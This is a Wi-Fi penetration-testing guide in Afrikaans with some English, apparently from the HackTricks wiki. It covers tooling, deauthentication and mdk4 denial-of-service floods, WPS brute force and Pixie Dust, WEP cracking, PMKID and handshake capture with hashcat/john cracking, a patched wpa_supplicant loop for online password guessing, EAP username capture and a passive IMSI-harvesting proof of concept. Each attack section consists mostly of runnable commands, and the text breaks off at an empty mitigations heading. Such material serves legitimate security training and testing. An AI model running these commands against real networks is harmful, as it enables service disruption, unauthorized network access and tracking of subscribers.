# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi basiese kommando's
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Gereedskap

### Hijacker & NexMon (Android interne Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Voer airgeddon met docker uit**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Van: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Dit kan Evil Twin, KARMA, en Known Beacons-aanvalle uitvoer en daarna 'n phishing-sjabloon gebruik om die netwerk se regte wagwoord te verkry of sosiale netwerk-inlogbewyse af te vang.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

This tool automates **WPS/WEP/WPA-PSK** attacks. It will automatically:

- Stel die interface in monitor mode
- Skandeer vir moontlike netwerke - en laat jou die teiken(s) kies
- Indien WEP - Begin WEP-aanvalle
- Indien WPA-PSK
- Indien WPS: Pixie dust attack en die bruteforce attack (wees versigtig — die brute-force attack kan 'n lang tyd neem). Let wel dat dit nie null PIN of database/generated PINs probeer nie.
- Probeer die PMKID van die AP vang om dit te crack
- Probeer kliënte van die AP deauthenticate om 'n handshake te capture
- Indien PMKID of Handshake, probeer bruteforce met top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Ontkoppel almal (of 'n spesifieke ESSID/Client)
- Random fake APs -- Verberg netwerke, kan skandeerders laat crash
- Overload AP -- Probeer die AP uitskakel (gewoonlik nie baie nuttig nie)
- WIDS -- Speel met die IDS
- TKIP, EAPOL -- Sommige spesifieke aanvalle om sommige APs te DoS
- **Cracking**
- Crack **WEP** (verskeie tools en metodes)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Nuttig om captive portal creds te capture en/of LAN-aanvalle uit te voer
- **WPA-PSK** Evil Twin -- Nuttig vir netwerk-aanvalle as jy die password ken
- **WPA-MGT** -- Nuttig om company credentials te capture
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Nuttig om captive portal creds te capture en/of LAN-aanvalle uit te voer
- **+ WPA** -- Nuttig om WPA handshakes te capture

## Open / OWE networks quick notes

- **Passive capture** op open SSIDs werk steeds met monitor mode en tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) voer 'n per-stasie sleutelruil uit (no PSK), sodat lugframes selfs op "open" SSIDs gekodeer is. Aangesien dit op WPA3 gebaseer is, afdwing dit ook **802.11w PMF**, wat gespoofte deauth/disassoc frames blokkeer.
- OWE **authentiseer nie** toetreders: enigiemand kan assosieer, so **verifieer client isolation** in plaas daarvan om bemarkingsaansprake te vertrou. Sonder isolasie werk ARP spoofing of responder-style poisoning op die plaaslike L2 steeds.
- **Evil Twin** bly uitvoerbaar op open/OWE SSIDs deur 'n sterker sein aan te bied; PMF verwyder net die deauth-kortpad. As slagoffers 'n vervalste TLS cert aanvaar, word volle HTTP(S) MitM herstel.
- Broadcast poisoning op open gaste-Wi-Fi lewer maklik creds/hashes (LLMNR/NBT-NS/mDNS). Sien:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication**-aanvalle, 'n algemene metode in Wi-Fi-hacking, behels die vervalsing van "management" frames om toestelle met krag van 'n netwerk af te koppel. Hierdie onversleutelde pakkette mislei kliënte om te dink hulle kom van die regmatige netwerk af, wat aanvallers in staat stel om WPA handshakes vir cracking te versamel of netwerkverbindings aanhoudend te ontwrig. Hierdie taktiek, ontstellend in sy eenvoud, word wyd gebruik en het beduidende implikasies vir netwerksekuriteit.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 beteken deauthentication
- 1 is die aantal deauths om te stuur (jy kan meerdere stuur as jy wil); 0 beteken om hulle voortdurend te stuur
- -a 00:14:6C:7E:40:80 is die MAC-adres van die access point
- -c 00:0F:B5:34:30:30 is die MAC-adres van die client om te deauthenticate; as dit weggelaat word, word 'n broadcast deauthentication gestuur (werk nie altyd nie)
- ath0 is die interface naam

### Disassociation Packets

**Disassociation packets**, soortgelyk aan deauthentication packets, is 'n tipe management frame wat in Wi-Fi netwerke gebruik word. Hierdie packets dien om die verbinding tussen 'n toestel (soos 'n laptop of smartphone) en 'n access point (AP) te verbreek. Die primêre onderskeid tussen disassociation en deauthentication lê in hul gebruiksscenario's. Terwyl 'n AP **deauthentication packets om rogue devices eksplicitlik uit die netwerk te verwyder, disassociation packets word tipies gestuur wanneer die AP afgeskakel** is, herbegin of verskuif word, en dus vereis dat alle gekoppelde nodes ontkoppel word.

**Hierdie aanval kan uitgevoer word deur mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Meer DOS-aanvalle deur mdk4**

**Sien** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Stuur beacon frames om vals APs aan kliënte te wys. Dit kan soms netwerk-skandeerders en selfs drivers laat crash!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Deur authentication frames na alle toeganklike Access Points (APs) binne bereik te stuur, kan hierdie APs oorlaai word, veral wanneer talle clients betrokke is. Hierdie intensiewe verkeer kan tot stelselinstabiliteit lei, wat veroorsaak dat sommige APs vries of selfs herbegin.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**AANVAL MODUS p: SSID Probing and Bruteforcing**

Probing Access Points (APs) kontroleer of 'n SSID korrek geopenbaar word en bevestig die AP se bereik. Hierdie tegniek, gekoppeld aan **bruteforcing hidden SSIDs** met of sonder 'n wordlist, help om versteekte netwerke te identifiseer en toegang daartoe te kry.

**AANVAL MODUS m: Michael Countermeasures Exploitation**

Deur ewekansige of duplikaatpakkette na verskillende QoS-rye te stuur, kan Michael Countermeasures op **TKIP APs** getrigger word, wat lei tot 'n een minuut lange AP-afskakeling. Hierdie metode is 'n effektiewe **DoS** (Denial of Service) aanvalstaktiek.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Die oorlaai van 'n AP met **EAPOL Start frames** skep **valse sessies**, oorweldig die AP en blokkeer regmatige kliënte. Alternatiewelik dwing die inspuiting van **valse EAPOL Logoff messages** kliënte om af te koppel; albei metodes ontwrig netwerkdiens doeltreffend.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

Verskeie aanvalle op skakelbestuur en routering in mesh-netwerke.

**ATTACK MODE w: WIDS Confusion**

Kruisverbinding van kliënte na meerdere WDS nodes of valse rogue APs kan Intrusion Detection and Prevention Systems manipuleer, wat verwarring en potensiële misbruik van die stelsel veroorsaak.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

A packet fuzzer wat verskeie packet sources en 'n omvattende stel modifiers vir packet manipulation bied.

### **Airggedon**

_**Airgeddon**_ bied die meeste van die aanvallings wat in die vorige kommentaar voorgestel is:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) vereenvoudig die proses om toestelle aan 'n router te koppel en verbeter die opstelspoed en gemak vir netwerke wat met **WPA** of **WPA2** Personal enkripsie beskerm is. Dit is nie effektief teen die maklik gekompromitteerde WEP nie. WPS gebruik 'n 8-syfer PIN, wat in twee halfdele geverifieer word, wat dit vatbaar maak vir brute-force-aanvalle weens die beperkte aantal kombinasies (ongeveer 11 000 moontlikhede).

### WPS Bruteforce

Daar is 2 hoofgereedskap om hierdie aksie uit te voer: Reaver en Bully.

- **Reaver** is ontwerp as 'n robuuste en praktiese aanval teen WPS, en is getoets teen 'n wye verskeidenheid access points en WPS-implementasies.
- **Bully** is 'n **new implementation** of the WPS brute force attack, geskryf in C. Dit het verskeie voordele bo die oorspronklike reaver-kode: minder dependencies, verbeterde memory- en cpu-prestasie, korrekte hantering van endianness, en 'n meer robuuste stel opsies.

Die aanval benut die **WPS PIN se kwesbaarheid**, veral die blootstelling van die eerste vier syfers en die laaste syfer se rol as 'n checksum, wat die brute-force-aanval vergemaklik. Verdedigings teen brute-force-aanvalle, soos **blocking MAC addresses** van aggressiewe aanvallers, vereis egter **MAC address rotation** om die aanval voort te sit.

Wanneer die WPS PIN verkry is met gereedskap soos Bully of Reaver, kan die aanvaller die WPA/WPA2 PSK aflei, wat **bestendige netwerktoegang** verseker.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Hierdie verfynde benadering mik op WPS PINs deur bekende kwesbaarhede te benut:

1. **Pre-discovered PINs**: Gebruik 'n databasis van bekende PINs wat gekoppel is aan spesifieke vervaardigers wat geneig is om uniforme WPS PINs te gebruik. Hierdie databasis korreleer die eerste drie oktette van MAC-addresses met waarskynlike PINs vir hierdie vervaardigers.
2. **PIN Generation Algorithms**: Gebruik algoritmes soos ComputePIN en EasyBox, wat WPS PINs bereken gebaseer op die AP se MAC-address. Die Arcadyan algoritme vereis bykomend 'n device ID, wat 'n ekstra laag tot die PIN-generasieproses toevoeg.

### WPS Pixie Dust attack

**Dominique Bongard** het 'n fout ontdek in sommige toegangspunte (APs) met betrekking tot die skep van geheime kodes, bekend as **nonces** (**E-S1** and **E-S2**). As hierdie nonces uitgevind kan word, word dit eenvoudig om die AP se WPS PIN te kraak. Die AP openbaar die PIN binne 'n spesiale kode (hash) om te bewys dat dit eg is en nie 'n valse (rogue) AP nie. Hierdie nonces is in wese die "sleutels" om die "kluis" te ontsluit wat die WPS PIN bevat. Meer hieroor is te vinde [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

In eenvoudige terme is die probleem dat sommige APs nie ewekansige genoeg sleutels gebruik het om die PIN te enkripteer tydens die konneksieproses nie. Dit maak die PIN kwesbaar om van buite die netwerk geraden te word (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
As jy nie die toestel na monitor mode wil omskakel nie, of as `reaver` en `bully` 'n probleem ondervind, kan jy [OneShot-C](https://github.com/nikita-yfh/OneShot-C) probeer. Hierdie tool kan 'n Pixie Dust attack uitvoer sonder om na monitor mode te hoef te skakel.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Sommige swak ontwerpte stelsels laat selfs 'n **Null PIN** ('n leë of nie-bestaande PIN) toegang verleen, wat nogal ongewoon is. Die tool **Reaver** kan hierdie kwesbaarheid toets, anders as **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Al die voorgestelde WPS-aanvalle kan maklik uitgevoer word met _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 en 6 laat jou toe om **jou eie PIN** te probeer (as jy een het)
- 7 en 8 voer die **Pixie Dust attack** uit
- 13 laat jou toe om die **NULL PIN** te toets
- 11 en 12 sal **haal die PINs wat verband hou met die geselekteerde AP uit beskikbare databasisse** en **genereer** moontlike **PINs** gebruik makend van: ComputePIN, EasyBox en opsioneel Arcadyan (aanbeveel, hoekom nie?)
- 9 en 10 sal **elke moontlike PIN** toets

## **WEP**

**Hoekom dit ineenstort**

- RC4 seed is net **IV (24 bits) + shared key**. Die IV is cleartext, klein (2^24), en herhaal vinnig, so ciphertexts met dieselfde IV hergebruik die keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; voorspelbare headers + RC4 KSA biases (**FMS**) laat jou “vote” key bytes. **PTW** optimaliseer dit deur ARP traffic te gebruik om die vereistes te verlaag na tienduisende packets in plaas van miljoene.
- Integriteit is slegs **CRC32** (linear/unkeyed), so 'n aanvaller kan bits flip en CRC32 herbereken sonder die sleutel → packet forgery/replay/ARP injection terwyl hy vir IVs wag.

Praktiese kraak is deterministies:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon bevat nog steeds "All-in-One" WEP-werkvloei as jy 'n begeleide UI verkies.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018 het **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) 'n nuwe aanvalsmethode bekendgemaak, uniek omdat dit net **een enkele pakket** benodig en nie vereis dat enige kliënte aan die teikeng AP gekoppel is nie — net interaksie tussen die aanvaller en die AP.

Baie moderne routers voeg 'n **opsionele veld** by die **eerste EAPOL**-raam tydens assosiasie, bekend as `Robust Security Network`. Dit sluit die `PMKID` in.

Soos die oorspronklike pos verduidelik, word die **PMKID** geskep met behulp van bekende data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Aangesien die "PMK Name" konstant is, en ons die BSSID van die AP en die station ken, en die `PMK` identies is aan dié van 'n volledige 4-way handshake, kan **hashcat** hierdie inligting gebruik om die PSK te crack en die passphrase te herstel!

Om hierdie inligting te **gather** en plaaslik die wagwoord te **bruteforce**, kan jy doen:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs captured** sal in die **console** vertoon en ook **gestoor** binne \_ **/tmp/attack.pcap**\_\
Skakel nou die capture na **hashcat/john** formaat en crack dit:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Neem asseblief kennis dat die formaat van 'n korrekte hash uit **4 dele** bestaan, soos: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` As joune **slegs** **3 dele** bevat, is dit **ongeldig** (die PMKID capture was nie geldig nie).

Let wel dat `hcxdumptool` **ook capture handshakes** (iets soos dit sal verskyn: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Jy kan die **handshakes** **transformeer** na **hashcat**/**john** formaat met `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ek het opgemerk dat sommige handshakes wat met hierdie tool captured is nie cracked kon word nie, selfs al is die korrekte password bekend. Ek beveel aan om handshakes ook via die tradisionele manier te capture indien moontlik, of verskeie daarvan met hierdie tool te capture._

### Handshake capture

'n Aanval op **WPA/WPA2** netwerke kan uitgevoer word deur 'n **handshake** te capture en te probeer die **password** **offline** te **crack**. Hierdie proses behels die monitor van die kommunikasie van 'n spesifieke netwerk en die **BSSID** op 'n bepaalde **channel**. Hier is 'n gestroomlynde gids:

1. Identifiseer die **BSSID**, **channel**, en 'n **connected client** van die teiken-netwerk.
2. Gebruik `airodump-ng` om die netwerkverkeer op die gespesifiseerde **channel** en **BSSID** te monitor, in die hoop om 'n **handshake** te capture. Die opdrag sal soos volg lyk:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Om die kans om 'n handshake te vang te verhoog, ontkoppel die kliënt kortstondig van die netwerk om 'n re-authentication af te dwing. Dit kan gedoen word met die `aireplay-ng`-opdrag, wat deauthentication packets na die kliënt stuur:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Let daarop dat aangesien die client deauthenticated was, kan dit probeer om met 'n ander AP te verbind of, in ander gevalle, met 'n ander netwerk._

Sodra in die `airodump-ng` sekere handshake-inligting verskyn, beteken dit dat die handshake vasgevang is en jy kan ophou luister:

![](<../../images/image (172) (1).png>)

Sodra die handshake vasgevang is, kan jy dit met `aircrack-ng` **crack**:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Kontroleer of daar 'n handshake in die lêer is

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_As hierdie tool 'n onvoltooide handshake van 'n ESSID vind voordat die voltooide een gevind is, sal dit nie die geldige een opspoor nie._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Vinniger aanlyn PSK guessing via `wpa_supplicant` ctrl socket (no clients/PMKID)

Wanneer geen clients naby is en die AP PMKID weier, kan jy PSKs aanlyn deurloop sonder om supplicants te respawn:

- Pas `wpa_supplicant.c` aan om `dur = 0;` af te dwing in die auth failure backoff logic (omtrent `ssid->auth_failures`), wat effektief die temporary-disable timer deaktiveer.
- Start 'n enkele daemon met 'n control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Bestuur dit via die control interface, hergebruik dieselfde scan en network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
'n Klein Python-lus wat socket-gebeurtenisse lees (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) kan ongeveer 100 gokpogings in ~5 minute toets sonder scan-overhoof. Dit is steeds lawaaierig en opspoorbaar, maar vermy per-poging proses-herlaaie en backoff delays.

## **WPA Enterprise (MGT)**

In **enterprise WiFi-opstellings sal jy verskeie verifikasie-metodes teëkom**, elk wat verskillende veiligheidsvlakke en bestuursfunksies bied. Wanneer jy gereedskap soos `airodump-ng` gebruik om netwerkverkeer te ondersoek, mag jy identifiseerders vir hierdie verifikasie-tipes opmerk. Sommige algemene metodes sluit in:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Hierdie metode ondersteun hardware tokens en one-time passwords binne EAP-PEAP. Anders as MSCHAPv2, gebruik dit nie 'n peer challenge' nie en stuur wagwoorde in plaintext na die access point, wat 'n risiko veroorsaak vir downgrade-aanvalle.
2. **EAP-MD5 (Message Digest 5)**:
- Betrek die stuur van die MD5-hash van die wagwoord vanaf die kliënt. Dit word **nie aanbeveel** weens kwesbaarheid vir woordeboek-aanvalle, gebrek aan server-authentisering, en onmoontlikheid om sessiespesifieke WEP-sleutels te genereer.
3. **EAP-TLS (Transport Layer Security)**:
- Gebruik beide kliënt- en server-side sertifikate vir authentisering en kan dinamies user-based en session-based WEP-sleutels genereer om kommunikasie te beveilig.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Verskaf wederkerige authentisering deur 'n enkripsie-tunnel, saam met 'n metode om dinamiese, per-user, per-session WEP-sleutels af te lei. Dit vereis slegs server-side sertifikate, terwyl kliënte kredensiale gebruik.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Werk soortgelyk aan EAP deur 'n TLS-tunnel te skep vir beskermde kommunikasie. Dit laat die gebruik van swakere authentiseringsprotokolle bo-op EAP toe as gevolg van die beskerming wat die tunnel bied.
- **PEAP-MSCHAPv2**: Gereeld na verwys as PEAP, kombineer dit die kwesbare MSCHAPv2 challenge/response-meganisme met 'n beskermende TLS-tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Soortgelyk aan EAP-TLS maar begin 'n TLS-tunnel voordat sertifikate uitgeruil word, wat 'n addisionele sekuriteitslaag bied.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) dit lyk of as jy **EAP** gebruik die **"Identity"** **messages** moet **supported** wees, en die **username** gaan in **clear** gestuur word in die **"Response Identity"** messages.

Selfs wanneer een van die veiligste authentiseringsmetodes gebruik word: **PEAP-EAP-TLS**, is dit moontlik om die **username wat in die EAP-protokol gestuur is** te **capture**. Om dit te doen, **capture 'n authentication communication'** (begin `airodump-ng` binne 'n channel en `wireshark` in dieselfde interface) en filter die pakkette met `eapol`.\
Binne die "**Response, Identity**" packet, sal die **username** van die kliënt verskyn.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding word ondersteun deur beide EAP-PEAP en EAP-TTLS. In die konteks van 'n WiFi-netwerk word 'n EAP-Identity request gewoonlik geïnisieer deur die access point (AP) tydens die association-proses. Om die beskerming van gebruiker-anonimiteit te verseker, bevat die response van die EAP-kliënt op die gebruiker se toestel slegs die essensiële inligting wat benodig word vir die aanvanklike RADIUS-server om die versoek te verwerk. Hierdie konsep word geïllustreer deur die volgende scenario's:

- EAP-Identity = anonymous
- In hierdie scenario gebruik alle gebruikers die pseudonieme "anonymous" as hul user identifier. Die aanvanklike RADIUS-server funksioneer as óf 'n EAP-PEAP óf EAP-TTLS server, verantwoordelik vir die bestuur van die server-side van die PEAP of TTLS-protokol. Die inner (protected) authentiseringsmetode word dan of plaaslik hanteer of gedelegeer na 'n remote (home) RADIUS-server.
- EAP-Identity = anonymous@realm_x
- In hierdie situasie verberg gebruikers van verskillende realms hul identiteite terwyl hulle hul onderskeie realms aandui. Dit laat die aanvanklike RADIUS-server toe om die EAP-PEAP of EAP-TTLS versoeke te proxy na RADIUS-servers in hul home realms, wat as die PEAP of TTLS server optree. Die aanvanklike RADIUS-server funksioneer slegs as 'n RADIUS relay node.
- Alternatiewelik kan die aanvanklike RADIUS-server funksioneer as die EAP-PEAP of EAP-TTLS server en óf die protected authentiseringsmetode hanteer óf dit aan 'n ander server deurstuur. Hierdie opsie fasiliteer die konfigurasie van verskillende beleide vir verskeie realms.

In EAP-PEAP, sodra die TLS-tunnel gevestig is tussen die PEAP server en die PEAP kliënt, inisieer die PEAP server 'n EAP-Identity request en stuur dit deur die TLS-tunnel. Die kliënt reageer op hierdie tweede EAP-Identity request deur 'n EAP-Identity response te stuur wat die gebruiker se ware identiteit deur die enkripsie-tunnel bevat. Hierdie benadering voorkom effektief dat iemand wat op die 802.11-verkeer afluister die gebruiker se werklike identiteit kan sien.

EAP-TTLS volg 'n effens ander prosedure. Met EAP-TTLS authentiseer die kliënt gewoonlik met PAP of CHAP, beveilig deur die TLS-tunnel. In hierdie geval sluit die kliënt 'n User-Name attribute en óf 'n Password óf CHAP-Password attribute in die aanvanklike TLS-bericht wat gestuur word na tunneling.

Ongeag die gekose protokol, kry die PEAP/TTLS server kennis van die gebruiker se werklike identiteit nadat die TLS-tunnel gevestig is. Die werklike identiteit kan voorgestel word as user@realm of eenvoudig user. Indien die PEAP/TTLS server ook verantwoordelik is vir die authentisering van die gebruiker, het dit nou die gebruiker se identiteit en gaan voort met die authentiseringsmetode beskerm deur die TLS-tunnel. Alternatiewelik kan die PEAP/TTLS server 'n nuwe RADIUS-versoek na die gebruiker se home RADIUS-server stuur. Hierdie nuwe RADIUS-versoek laat die PEAP of TTLS protokollaag uit. In gevalle waar die protected authentiseringsmetode EAP is, word die inner EAP-boodskappe na die home RADIUS-server gestuur sonder die EAP-PEAP of EAP-TTLS omhulsel. Die User-Name attribute van die uitgaande RADIUS-bericht bevat die gebruiker se ware identiteit, wat die anonymous User-Name van die inkomende RADIUS-versoek vervang. Wanneer die protected authentiseringsmetode PAP of CHAP is (slegs deur TTLS ondersteun), word die User-Name en ander authentisering-attribuite wat uit die TLS-payload gehaal is, vervang in die uitgaande RADIUS-bericht, en neem die plek in van die anonymous User-Name en TTLS EAP-Message attributes in die inkomende RADIUS-versoek.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Klik om uit te vou</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Werk voor enige TLS‑tonnel as die implementering direk EAP‑SIM/AKA gebruik sonder beskermde identiteit/pseudonieme.
- Die blootgestelde waarde is ’n permanente identifiseerder wat aan die intekenaar se SIM gekoppel is; versameling daarvan maak langtermyn‑opsporing en daaropvolgende telekommunikasie‑misbruik moontlik.

Impak
- Privaatheid: volgehoue gebruiker-/toestelopsporing deur passiewe Wi‑Fi‑vaslegging in openbare plekke.
- Telekommunikasie‑misbruik‑beginpunt: met die IMSI kan ’n aanvaller met SS7/Diameter‑toegang ligging navraag doen of probeer oproep/SMS‑afluistering en MFA‑diefstal uitvoer.

Versagtingsmaatreëls / waarna om te kyk
